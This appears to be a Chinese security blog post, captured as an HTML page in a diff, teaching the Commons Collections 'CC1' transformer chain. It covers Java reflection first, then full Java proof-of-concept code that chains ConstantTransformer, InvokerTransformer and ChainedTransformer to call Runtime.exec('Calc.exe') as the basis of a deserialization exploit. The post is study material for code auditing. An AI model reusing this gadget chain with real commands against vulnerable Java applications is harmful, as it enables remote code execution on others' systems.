@@ -1,0 +1,273 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Commons Collections迭代调用链 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="CC1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Commons Collections迭代调用链">
+<meta property="og:url" content="https://4reexile.github.io/article/cc1-basic/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="CC1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2025-08-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-21T09:28:44.121Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/cc1-basic/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Commons Collections迭代调用链',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-21 17:28:44'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">107</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Commons Collections迭代调用链</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-08-04T16:00:00.000Z" title="Created 2025-08-05 00:00:00">2025-08-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-21T09:28:44.121Z" title="Updated 2025-11-21 17:28:44">2025-11-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.3k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>参考文章</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html">大白话说Java反射：入门、使用、原理</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/java/java-reflection.html">菜鸟教程-Java反射</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36869808/article/details/121105988">csdn-反序列化调用链——Commons Collections 迭代调用链</a></li>
+</ol>
+<h1>前置知识</h1>
+<p><strong>反射</strong>: Java在运行时动态获取类信息、操作类属性和方法的能力</p>
+<p>如何获取一个对象:</p>
+<ol>
+<li>获取类的 Class 对象实例</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.zhenai.api.Apple&quot;</span>);</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>根据 CLass 对象实例获取 Constructor 对象</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">appleConstructor</span> <span class="operator">=</span> clz.getConstructor();</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>使用 Constructor 对象的 newInstance 方法获取反射类对象</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">appleObj</span> <span class="operator">=</span> appleConstructor.newInstance();</span><br></pre></td></tr></table></figure>
+<p>如何调用某一个方法:</p>
+<ol>
+<li>获取方法的 Method 对象</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">setPriceMethod</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;setPrice&quot;</span>, <span class="type">int</span>.class);</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>利用 invoke 方法调用方法</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setPriceMethod.invoke(appleObj, <span class="number">14</span>);</span><br></pre></td></tr></table></figure>
+<p>特点:</p>
+<ul>
+<li>突破封装性：可访问私有成员（需setAccessible(true)）</li>
+<li>动态性：运行时才确定操作对象（如<code>Class.forName(&quot;java.lang.Runtime&quot;</code>方法)）</li>
+<li>自省能力：可获取类结构（方法、字段、注解等）</li>
+</ul>
+<blockquote>
+<p>反射使攻击者能绕过Java的访问控制，操作<code>Runtime</code>等敏感类。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>作用</th>
+<th>漏洞利用中的角色</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>反射</td>
+<td>运行时动态操作类</td>
+<td>突破Java安全机制的基础能力</td>
+</tr>
+<tr>
+<td>反射获取方法</td>
+<td>提取类中的特定方法</td>
+<td>获取敏感方法（如 <code>getRuntime</code>）</td>
+</tr>
+<tr>
+<td>反射调用</td>
+<td>动态执行方法</td>
+<td>触发命令执行（如 <code>exec()</code>)</td>
+</tr>
+</tbody>
+</table>
+<h1>迭代链</h1>
+<h2 id="poc"><a class="header-anchor" href="#poc">¶</a>poc</h2>
+<p>POC如下:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 创建Transformer链数组（关键恶意操作序列）</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">    <span class="comment">// 固定返回Runtime类的Class对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,  </span><br><span class="line">        <span class="comment">// 方法参数类型</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">        <span class="comment">// 获取getRuntime方法</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,  </span><br><span class="line">        <span class="comment">// 方法参数类型</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),        </span><br><span class="line">        <span class="comment">// 调用getRuntime()获取Runtime实例</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,                 </span><br><span class="line">        <span class="comment">// 方法参数类型</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;)                  </span><br><span class="line">        <span class="comment">// 执行系统命令</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这是手动触发transfrom迭代链的方法</p>
+<ul>
+<li>拿到对应类</li>
+<li>反射获取方法</li>
+<li>执行方法</li>
+<li>触发</li>
+</ul>
+<p>一般来说真实情况会是下面这样</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i)&#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看不懂吗, 看不懂就对了</p>
+<blockquote>
+<p>每个 <code>InvokerTransformer</code> 只能执行一个方法调用。要执行复杂操作，需要将多个转换器连接起来</p>
+</blockquote>
+<h2 id="获取目标类"><a class="header-anchor" href="#获取目标类">¶</a>获取目标类</h2>
+<p>我们可以通过<code>ConstantTransformer</code>类中的transform方法来获取类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object o=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class).transform(Object.class); System.out.println(o);</span><br><span class="line"><span class="comment">// class java.lang.Runtime</span></span><br></pre></td></tr></table></figure>
+<p><code>ConstantTransformer</code>实现了<code>Transformer</code>接口，重写了transform, 直接来看重写的内容, 发现可以获取到对应的类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="获取目标类方法"><a class="header-anchor" href="#获取目标类方法">¶</a>获取目标类方法</h2>
+<p>获取目标类的方式使用的<code>InvokerTransformer</code>, <code>InvokerTransformer</code>类的主要作用就是利用Java反射机制来创建类实例</p>
+<p><code>Transformer</code>方法是直接调用反射机制来获取到方法的实例</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 此处调用反射机制</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(methodName, paramTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(...);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么我们执行exec就要进行连续获取
+<code>getMethod</code>-&gt;<code>getRuntime</code>-&gt;<code>invoke</code>-&gt;<code>exec</code></p>
+<p>那么获取执行方法实例的poc就是</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类, o是java.lang.Runtime的Class对象</span></span><br><span class="line">Object o=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class).transform(Object.class);</span><br><span class="line"><span class="comment">// 获取getRuntime方法, a是getRuntime方法的Method对象</span></span><br><span class="line">Object a=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(o);</span><br><span class="line"><span class="comment">// 调用getRuntime方法, b是Runtime单例实例</span></span><br><span class="line">Object b=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;).transform(a);</span><br><span class="line"><span class="comment">// 执行exec命令</span></span><br><span class="line">Object c=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;).transform(b);</span><br></pre></td></tr></table></figure>
+<h2 id="迭代调用"><a class="header-anchor" href="#迭代调用">¶</a>迭代调用</h2>
+<p>那么直接调用的方式是我们需要手动的去调用他们的transform方法, 肯定无法在实战中使用, 我们需要找到一个可以进行迭代调用的方式</p>
+<p>庆幸的是存在一个<code>ChainedTransformer</code>类, 该类实现了<code>Transformer</code>链式调用; 我们只需要传入一个<code>Transformer</code>数组<code>ChainedTransformer</code>就可以实现依次的去调用每一个<code>Transformer</code>的transform方法</p>
+<p>那么我们通过<code>ChainedTransformer</code>类调用：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(Object.class);</span><br></pre></td></tr></table></figure>
+<p>那么这样就可以直接触发整个transformers数组的Transform方法。 面临的问题就是如何去触发<code>ChainedTransformer</code>的Transform方法。那么这个就是之后整个反序列链的基础链</p>
+<h1>总结</h1>
+<p>所以核心就是下面这三个</p>
+<ul>
+<li><code>ConstantTransformer</code>获取类</li>
+<li><code>InvokerTransformer</code>反射方法</li>
+<li><code>ChainedTransformer</code>迭代调用</li>
+</ul>
+<h1>完整代码</h1>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        transformerChain.transform(Object.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/cc1-basic/">https://4reexile.github.io/article/cc1-basic/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/Java-agent/" title="Java代理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Java代理</div></div></a></div><div class="next-post pull-right"><a href="/article/java-unser/" title="Java反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Java反序列化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/cb-chain/" title="Commons-Beanutils链"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-07</div><div class="title">Commons-Beanutils链</div></div></a></div><div><a href="/article/cc-chain/" title="Commons-Collection链"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-03</div><div class="title">Commons-Collection链</div></div></a></div><div><a href="/article/Java-ref/" title="Java反射"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-10</div><div class="title">Java反射</div></div></a></div><div><a href="/article/Java-agent/" title="Java代理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-08</div><div class="title">Java代理</div></div></a></div><div><a href="/article/java-unser/" title="Java反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-05</div><div class="title">Java反序列化</div></div></a></div><div><a href="/article/Java-pre01/" title="Java反序列化漏洞核心组件"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="title">Java反序列化漏洞核心组件</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">107</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">迭代链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">2.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item 